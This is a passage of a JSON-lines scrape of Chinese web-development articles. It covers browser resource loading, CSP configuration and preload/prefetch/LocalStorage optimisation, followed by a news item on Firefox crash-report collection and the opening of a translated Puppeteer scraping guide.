audio都属于该类资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekManifest\u003c/td\u003e\n\u003ctd\u003eHTML5 应用程序缓存资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekMock\u003c/td\u003e\n\u003ctd\u003e预留的测试类型\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 class=\"heading\"\u003e第二步：安全策略检查\u003c/h5\u003e\n\u003cp\u003e网页安全政策（Content Security Policy，缩写 CSP）是由浏览器提供的一种白名单制度。开发者通过配置，来告诉浏览器各类外部资源的加载和执行限制，来提高网页的安全性。一种最常用的应用就是通过限制非信任域名脚本的加载来预防XSS攻击。\n可以通过两种方式来配置CSP。\n第一种，就是通过页面HTTP请求头的Content-Security-Policy字段来限制。如下图所示，这是www.google.com页面的请求头：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c40056914c841?w=1101\u0026amp;h=155\u0026amp;f=jpeg\u0026amp;s=133775\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n第二种是，通过\u003ccode\u003e\u0026lt;meta\u0026gt;\u003c/code\u003e标签来设置。\u003ccode\u003e\u0026lt;meta\u0026gt;\u003c/code\u003e是以key-value的方式来进行配置的。下面以几个具体的应用例子来介绍。\u003cp\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e用于预防XSS:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Content-Security-Policy\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"script-src 'self'; style-src nos.netease.com kaola.com;\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的\u003ccode\u003escript-src\u003c/code\u003e代表脚本资源；\u003ccode\u003estyle-src\u003c/code\u003e代表样式资源；\u003ccode\u003e'self'\u003c/code\u003e代表只信任当前域名下的外来资源，其他域下的资源全部会被拦截；\u003ccode\u003enos.netease.com kaola.com\u003c/code\u003e代表信任nos.netease.com和kaola.com这两个域名下的资源。\n所以上面的标签的意义就是：对于脚本资源只信任本域下的，对于样式资源，除了本域还会加载nos.netease.com和kaola.com这两个域名下的。\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e用于站点请求协议升级过渡（http转https）：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Content-Secur****ity-Policy\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"upgrade-insecure-requests\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的\u003ccode\u003eupgrade-insecure-requests\u003c/code\u003e的意义，就如同字面意思一样：升级所有非安全请求。当加了这个meta标签以后，浏览器会将https页面中的所有htttp请自动升级到https。例如，当我们需要进行全站http转https改造时，对于原有的大量http资源会直接强制以https或wss等SSL加密形式发送请求而不会报错。当然如果资源服务器不支持https等SSL加密，那么该资源还是不会载入。\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e用于阻止Mixed Content：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Content-Security-Policy\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"block-all-mixed-content\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e混合内容(Mixed Content)就是第2个例子所说的，在https站点中，进行的http请求。这类在安全链接中混合了非安全请求内容就叫混合内容。出现这类请求时，我们可以在浏览器控制台中找到对应的警告信息，如下图所示。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c40056936869b?w=1202\u0026amp;h=56\u0026amp;f=jpeg\u0026amp;s=102968\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n混合内容会降低HTTPS网站的安全性和用户体验。不过让人略感放心的是，浏览器对于可能对安全性造成较大威胁的资源类型的混合模式请求都会直接拦截报错，例如脚本资源，如下图所示。但对于图片、音频、视频等资源只会警告，但不会阻止其加载。\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c40056950e6f8?w=1178\u0026amp;h=164\u0026amp;f=png\u0026amp;s=77187\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n对于安全性要求极高的网站，可以通过上面的标签来阻止所以类型的非安全链接请求，这样包括图片、音频、视频等资源也将会被拦截报错。\n当然对于Content-Security-Policy的设置还有很多其他作用，大家可以通过\u003ca target=\"_blank\" title=\"MDN\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/Using_Content_Security_Policy\"\u003eMDN\u003c/a\u003e来做进一步了解。\u003cp\u003e\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e第三步：资源优先级计算\u003c/h5\u003e\n\u003cp\u003e资源的优先级被分为\u003cstrong\u003e5级\u003c/strong\u003e。不同资料上，对这\u003cstrong\u003e5级\u003c/strong\u003e的命名描述上可能有所不同。主要是因为资料本身可能是从\u003cstrong\u003e网络层面\u003c/strong\u003e，\u003cstrong\u003e浏览器内核\u003c/strong\u003e或者\u003cstrong\u003e用户端控制台显示\u003c/strong\u003e这三个方向中的某一个来说的。这三个方向虽然对这\u003cstrong\u003e5级\u003c/strong\u003e的命名不同，但都是一一对应的。\n\u003cstrong\u003e网络层面\u003c/strong\u003e，5级分别为：Highest、Medium、Low、Lowest、Idle;\n\u003cstrong\u003e浏览器内核\u003c/strong\u003e，5级分别为：VeryHigh、High、Medium、Low、VeryLow;\n\u003cstrong\u003e用户端控制台显示\u003c/strong\u003e，5级分别为：Highest、High、Medium、Low、Lowest;\u003c/p\u003e\n\u003cp\u003e下面是以\u003cstrong\u003e浏览器内核\u003c/strong\u003e作为研究方向，来介绍浏览器的资源优先级计算过程：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e第一步，根据资源的类型来设定默认优先级。\n对于每一类资源浏览器都有一个默认的加载优先级规则：\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003ehtml、css、font这三种类型的资源优先级最高；\u003c/li\u003e\n\u003cli\u003e然后是preload资源（通过\u003ca target=\"_blank\" title=\"preload\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Preloading_content\"\u003e\u003ccode\u003e\u0026lt;link rel=“preload\"\u0026gt;\u003c/code\u003e\u003c/a\u003e标签预加载）、script、xhr请求；\u003c/li\u003e\n\u003cli\u003e接着是图片、语音、视频；\u003c/li\u003e\n\u003cli\u003e最低的是\u003ca target=\"_blank\" title=\"prefetch\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Link_prefetching_FAQ\"\u003eprefetch\u003c/a\u003e预读取的资源。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003e第二步，根据一定的实际规则，对优先级进行调整。\n初始优先级设置好以后，浏览器会根据资源的实际属性和位于文档中的位置等方面，对优先级进行调整，来确定出最终的加载优先级顺序。对于几个常见资源类型的调整规则如下：\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e对于\u003cstrong\u003eXHR请求\u003c/strong\u003e资源：将\u003cstrong\u003e同步XHR请求\u003c/strong\u003e的优先级调整为最高。\nXHR请求可以分为同步请求和异步请求，浏览器会把同步请求的优先级提升到最高级，以便尽早获取数据、加快页面的显示。\u003c/li\u003e\n\u003cli\u003e对于\u003cstrong\u003e图片\u003c/strong\u003e资源：会根据图片是否在可见视图之内来改变优先级。\n图片资源的默认优先级为Low。现代浏览器为了提高用户首屏的体验，在渲染时会计算图片资源是否在首屏可见视图之内，在的话，会将这部分视口可见图片(Image in viewport)资源的优先级提升为High。\u003c/li\u003e\n\u003cli\u003e对于\u003cstrong\u003e脚本\u003c/strong\u003e资源：浏览器会将根据脚本所处的位置和属性标签分为三类，分别设置优先级。\n首先，对于添加了defer/async属性标签的脚本的优先级会全部降为Low。\n然后，对于没有添加该属性的脚本，根据该脚本在文档中的位置是在浏览器展示的第一张图片之前还是之后，又可分为两类。在之前的\u003ccode\u003e(标记early**)\u003c/code\u003e它会被定为High优先级，在之后的\u003ccode\u003e(标记late**)\u003c/code\u003e会被设置为Medium优先级。\n下图总结了资源优先级计算后各类资源的优先级情况，其中特别将上面讲的三种常见资源的情况框了出来。红框框中的为脚本类型、紫框的为图片类型、蓝框为XHR请求。图片来源\u003ca target=\"_blank\" title=\"点此\" href=\"https://docs.google.com/document/d/1bCDuq9H1ih9iNjgzyAL0gpwNFiEP4TZS-YLRp_RuMlc/edit#\"\u003e点此\u003c/a\u003e。\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c40056cc4e9cb?w=762\u0026amp;h=756\u0026amp;f=jpeg\u0026amp;s=360700\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 class=\"heading\"\u003e第四步：按照上面计算的安全策略和优先级来加载或阻塞资源。\u003c/h5\u003e\n\u003ch3 class=\"heading\"\u003e\u003cstrong\u003e关键请求链和优化\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e上面详细介绍了浏览器的资源加载过程，其中核心在于资源的加载优先顺序的计算。我们可以通过优化资源的加载优先级顺序，来有效提高页面的加载响应速度。\u003c/p\u003e\n\u003cp\u003e首先来介绍下\u003cstrong\u003e关键请求链（Critical-Request-Chains）\u003cstrong\u003e的概念。可视区域渲染完毕（首屏），并对于用户来说可用时，必须加载的资源请求队列，就叫做\u003c/strong\u003e关键请求链\u003c/strong\u003e。这样，我们可以通过\u003cstrong\u003e关键请求链\u003c/strong\u003e，来确定优先加载的资源以及加载顺序，以实现浏览器尽可能快地加载页面。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e如何查找页面的\u003cstrong\u003e关键请求链\u003c/strong\u003e\u003c/h5\u003e\n\u003col\u003e\n\u003cli\u003e通过首屏快照获取关键image资源。\n如下图所示，我们通过首屏快照，来获取首屏所要加载的图片资源。(红框内)\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c400569a32d84?w=401\u0026amp;h=692\u0026amp;f=jpeg\u0026amp;s=280489\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003cli\u003e通过\u003cstrong\u003eLightHouse\u003c/strong\u003e插件获取关键请求链中的关键js和css资源。\n\u003cstrong\u003eLightHouse\u003c/strong\u003e详细的使用方法可以通过点击\u003ca target=\"_blank\" title=\"此处\" href=\"https://developers.google.com/web/tools/lighthouse/\"\u003e此处\u003c/a\u003e来了解。通过执行该插件最终可以生成一个报告，里面包含了有关该页面性能的全方面报告和建议。其中有关关键请求链的报告如下图所示：\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c400593fe967c?w=975\u0026amp;h=477\u0026amp;f=jpeg\u0026amp;s=349574\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003cli\u003e通过浏览器控制台查看各个请求的优先级\n打开Chrome控制台，切换到Network tab下，就可以查看资源的优先级（Priority）。如果没有Priority一栏，可以右键在下拉菜单中勾选Priority即可。如下图所示：\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005968c3027?w=1195\u0026amp;h=672\u0026amp;f=jpeg\u0026amp;s=552740\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 class=\"heading\"\u003e优化\u003cstrong\u003e关键请求链\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e优化\u003cstrong\u003e关键请求链\u003c/strong\u003e有很多方法，这里主要介绍两种。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e第一种：利用\u003cstrong\u003ePreload\u003c/strong\u003e和\u003cstrong\u003ePrefetch\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e这两个标签在文章前面的介绍中就已经有所介绍，它们都属于预加载性能优化技术。对于开发人员，我们可能比浏览器更加了解我们的应用。从而可以使用该技术来预先告知浏览器某些资源可能在将来会被使用到，让浏览器对这部分资源进行提前加载。\n\u003cstrong\u003ePreload\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"preload\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"test.jpg\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003ePrefetch\u003c/strong\u003e:\nPrefetch包括资源预加载、DNS预解析、http预连接和页面预渲染。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e资源预加载：\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"prefetch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"test.css\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\nDNS预解析：\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"dns-prefetch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//haitao.nos.netease.com\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\nhttp预连接：\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"prefetch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//www.kaola.com\"\u003c/span\u003e\u0026gt;\u003c/span\u003e 将建立对该域名的TCP链接\n页面预渲染：\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"prerender\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//m.kaola.com\"\u003c/span\u003e\u0026gt;\u003c/span\u003e 将会预先加载链接文档的所有资源\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e那么\u003cstrong\u003ePrefetch\u003c/strong\u003e和\u003cstrong\u003ePreload\u003c/strong\u003e有什么区别呢？\n具体来讲，\u003cstrong\u003ePreload\u003c/strong\u003e来告诉浏览器预先请求当前页需要的资源，从而提高这些资源的请求优先级。比如，对于那些本来请求优先级较低的关键请求，我们可以通过设置\u003cstrong\u003ePrefetch\u003c/strong\u003e来提升这些请求的优先级。\n\u003cstrong\u003ePrefetch\u003c/strong\u003e来告诉浏览器用户将来可能在其他页面（非本页面）可能使用到的资源，那么浏览器会在空闲时，就去预先加载这些资源放在http缓存内，最常见的dns-prefetch。比如，当我们在浏览A页面，如果会通过A页面中的链接跳转到B页面，而B页面中我们有些资源希望尽早提前加载，那么我们就可以在A页面里添加这些资源\u003cstrong\u003ePrefetch\u003c/strong\u003e，那么当浏览器空闲时，就会去加载这些资源。\n所以，对于那些可能在当前页面使用到的资源可以利用\u003cstrong\u003ePrefetch\u003c/strong\u003e，而对一些可能在将来的某些页面中被使用的资源可以利用\u003cstrong\u003ePreload\u003c/strong\u003e。如果从加载优先级上看，\u003cstrong\u003ePrefetch\u003c/strong\u003e会提升请求优先级；而\u003cstrong\u003ePreload\u003c/strong\u003e会把资源的优先级放在最低，当浏览器空闲时才去预加载。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e泼盆冷水：\n既然\u003cstrong\u003ePrefetch\u003c/strong\u003e和\u003cstrong\u003ePreload\u003c/strong\u003e作用如此强大，我们是否可以放心使用呢？但实际上，除了dns-prefetch，其他的兼容性都十分堪忧。特别是在Safari上，由于苹果公司对安全性的苛刻要求，基本上对这些预加载技术都未实现支持。\n\u003cstrong\u003ePreload\u003c/strong\u003e的支持性如下图所示，发现新版chrome支持较好，但Safari全军覆没。\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c400590c3ec94?w=1259\u0026amp;h=427\u0026amp;f=jpeg\u0026amp;s=285679\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cstrong\u003edns-prefetch\u003c/strong\u003e支持性还不错。\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005a1dcc23f?w=1262\u0026amp;h=430\u0026amp;f=jpeg\u0026amp;s=293403\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cstrong\u003ePrefetch\u003c/strong\u003e同样的Safari全军覆没。\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c40059adc7457?w=1264\u0026amp;h=430\u0026amp;f=jpeg\u0026amp;s=279419\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e第二种：利用\u003cstrong\u003eLocalStorage\u003c/strong\u003e。\n既然第一种的预加载技术来进行资源缓存的支持性较差，那么通常可以利用\u003cstrong\u003eLocalStorage\u003c/strong\u003e来对部分请求的数据和结果进行缓存，省去发送http请求所消耗的时间，从而提高网页的响应速度。\n这类做法在移动端应用已经十分广泛。下面分别介绍鹅、猫、狗三家页面是如何利用LS来进行请求缓存的。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e微信\u003c/strong\u003e：利用LS来对js文件进行缓存。\n如下图所示，用浏览器打开一篇微信公众账号文章，打开控制台，发现Network里竟然一个js文件都不需要加载？一脸懵逼！\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005a368bee0?w=1081\u0026amp;h=726\u0026amp;f=jpeg\u0026amp;s=431126\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n切到LS才哗然大悟，原来所有的JS都藏在这里了！\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005c43f0ee9?w=1292\u0026amp;h=761\u0026amp;f=jpeg\u0026amp;s=964018\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n微信就是利用了这种技巧来缓存关键路径里的js资源，从而大大加快了页面访问速度。\n当然，实际实现起来，并不像表面看得那样，第一次访问时将js放到LS里，每次进来取出来执行这么简单，最核心的其实是需要设计一套缓存更新机制。首先我们对于缓存的js文件要通过后缀来设置独一无二的版本标识；其次，每次后端需要传一份资源配置文件，前端会根据这个配置文件来和LS中缓存的文件进行版本标识匹配，从而决定是利用LS缓存，还是重新发请求更新资源。例如，微信中的这个配置文件就是通过moon_map来同步输出给前端的，如下图所示：\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005cf38c26f?w=712\u0026amp;h=595\u0026amp;f=jpeg\u0026amp;s=921652\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e天猫\u003c/strong\u003e：利用LS来对关键的XHR异步请求进行缓存。\n以\u003ca target=\"_blank\" title=\"天猫超市首页\" href=\"https://chaoshi.m.tmall.com/\"\u003e天猫超市首页\u003c/a\u003e为例：\n如下图，查看LS，发现其对首屏中的轮播和10个分类入口的数据进行了缓存。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005cad0afdf?w=1798\u0026amp;h=632\u0026amp;f=jpeg\u0026amp;s=1109657\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\n上面的json内容，格式化后，发现其中包含banner和flowIcons这两个属性，里面的数据分别对应的就是轮播和分类入口的数据。这样就可以大大提升首屏的渲染展示时间。\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e京东\u003c/strong\u003e：利用LS来对非关键请求进行缓存。\n以PC版的\u003ca target=\"_blank\" title=\"京东首页\" href=\"https://www.jd.com/\"\u003e京东首页\u003c/a\u003e为例。京东反向思维，另辟奇径地采用了另一种方式来利用LS。那就是把非关键请求剥离出来存放在LS内。\n具体来说，对于首屏数据，还是正常加载和展示。但为了非首屏数据的加载和渲染会阻塞和抢占资源，从而影响首屏页面渲染。所以将非首屏资源的HTML/CSS等资源抽出来放在LS内，当页面滚动到可视区域时再去LS中获取数据，插入到dom中。这点很类似于现在的模块懒加载。如下图所示，每个LS里都包含了一个模块所需要的HTML/CSS的资源。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005c48a7106?w=1788\u0026amp;h=613\u0026amp;f=jpeg\u0026amp;s=1227196\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePS：广告一波，网易考拉前端招人啦~有兴趣的\u003ca target=\"_blank\" href=\"http://163.lu/SCYY62\"\u003e戳我投递简历\u003c/a\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eEND\u003c/h4\u003e\n\u003ch3 class=\"heading\"\u003e参考资料：\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e从Chrome源码看浏览器如何加载资源：https://zhuanlan.zhihu.com/p/30558018。\u003c/li\u003e\n\u003cli\u003ePreload，Prefetch 和它们在 Chrome 之中的优先级：https://yq.aliyun.com/articles/226240\u003c/li\u003e\n\u003cli\u003e聊聊浏览器资源加载优化：http://qingbob.com/let-us-talk-about-resource-load/\u003c/li\u003e\n\u003cli\u003e关键请求：http://www.zcfy.cc/article/the-critical-request-css-tricks-3843.html\u003c/li\u003e\n\u003cli\u003e其他：相关内容的MDN文档及Google Web Develop文档。\u003c/li\u003e\n\u003c/ol\u003e\n","buildTime":"1515151174.3043","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be9903"},"id":"5a4edcfe6fb9a01c91402f4d","author":{"$oid":"5a4f5f6218646e1ee8be98eb"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"FireFox 无视用户选择收集用户敏感信息","meta":{"likeCount":0},"tag":["Firefox","前端","程序员","浏览器"],"comment":[],"shortContent":"最近支付宝因为“默认勾选”而引发争议，众所周知，Mozilla基金会的Firefox火狐浏览器也是一直在默默收集可能包含敏感隐私信息的崩溃报告(crash reports)。这个选项是安装后“默认勾选”开启的，只在十分隐蔽的地方提供一个选项供用户选择关闭。 然而最近有报道称，自…","content":"\u003cp\u003e最近支付宝因为“默认勾选”而引发争议，众所周知，Mozilla基金会的Firefox火狐浏览器也是一直在默默收集可能包含敏感隐私信息的崩溃报告(crash reports)。这个选项是安装后“默认勾选”开启的，只在十分隐蔽的地方提供一个选项供用户选择关闭。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"默认勾选\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c43179939da41?w=988\u0026amp;h=444\u0026amp;f=png\u0026amp;s=21194\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e然而最近有报道称，自从Firefox 52版开始，Firefox就“无视”这个开关。换句话说，即便用户选择关闭这个发送报告的选项，Firefox还是会发送这种敏感报告到他们的服务器上。\u003c/p\u003e\n\u003cp\u003e这种报告不是匿名发送的，因为报告会包括你正在看的网页的网址（URL），而且甚至包含内存数据（memory dump）。也就是说他们有可能利用这种报告辨认出你是谁，你看了什么网页等各种敏感隐私信息。如果一旦泄露后果不堪设想。\u003c/p\u003e\n\u003cp\u003e然而Mozilla基金会对于这事的回应是，他们说这是Bug，他们“无意中”收集了用户的敏感隐私信息。长达九个月一直没有任何行动，而采取的措施仅仅是“将要”从他们服务器上删除这些报告。\u003c/p\u003e\n\u003cp\u003e我们不得不问，为什么“默认勾选”仍然存在，为什么不是“默认关闭”？针对注重隐私的用户，现在市面上有越来越多主打安全隐私的浏览器，比如Waterfox, Palemoon，Basilisk用于替代Firefox。\u003c/p\u003e\n\u003cp\u003e相关新闻链接：https://news.slashdot.org/story/18/01/03/1640209/mozilla-will-delete-firefox-crash-reports-collected-by-accident\u003c/p\u003e\n","buildTime":"1515151040.2284","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be9904"},"id":"5a4e1038f265da3e591e1247","author":{"$oid":"5a4f5f6218646e1ee8be98ea"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160c0ef5386ef345?w=290\u0026h=422\u0026f=png\u0026s=14169","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b3de688b?w=800\u0026h=601\u0026f=png\u0026s=33261","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b15632f3?w=800\u0026h=404\u0026f=png\u0026s=32595","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4c063a6b0?w=1000\u0026h=584\u0026f=png\u0026s=126304","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef5541226fc?w=800\u0026h=620\u0026f=png\u0026s=186811","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4c1ea2791?w=1000\u0026h=588\u0026f=png\u0026s=195043","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b60a1056?w=800\u0026h=653\u0026f=png\u0026s=187764","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef5337cf0dc?w=1000\u0026h=317\u0026f=png\u0026s=128377","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef53beed060?w=1000\u0026h=382\u0026f=png\u0026s=168564","https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b4dbf295?w=800\u0026h=539\u0026f=png\u0026s=244831"],"screenShot":null}],"title":"[译] JavaScript 自动化爬虫入门指北（Chrome + Puppeteer + Node JS）：和 Headless Chrome 一起装逼一起飞","meta":{"likeCount":0},"tag":["Node.js","Chrome","掘金翻译计划","爬虫"],"comment":[],"shortContent":"本文将会教你如何用 JavaScript 自动化 web 爬虫，技术上用到了 Google 团队开发的 Puppeteer。 Puppeteer 运行在 Node 环境，可以用来操作 headless Chrome。何谓 Headless Chrome？通俗来讲就是在不打开 C…","content":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e原文地址：\u003ca target=\"_blank\" href=\"https://codeburst.io/a-guide-to-automating-scraping-the-web-with-javascript-chrome-puppeteer-node-js-b18efb9e9921\"\u003eA Guide to Automating \u0026amp; Scraping the Web with JavaScript (Chrome + Puppeteer + Node JS)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e原文作者：\u003ca target=\"_blank\" href=\"https://codeburst.io/@bmorelli25?source=post_header_lockup\"\u003eBrandon 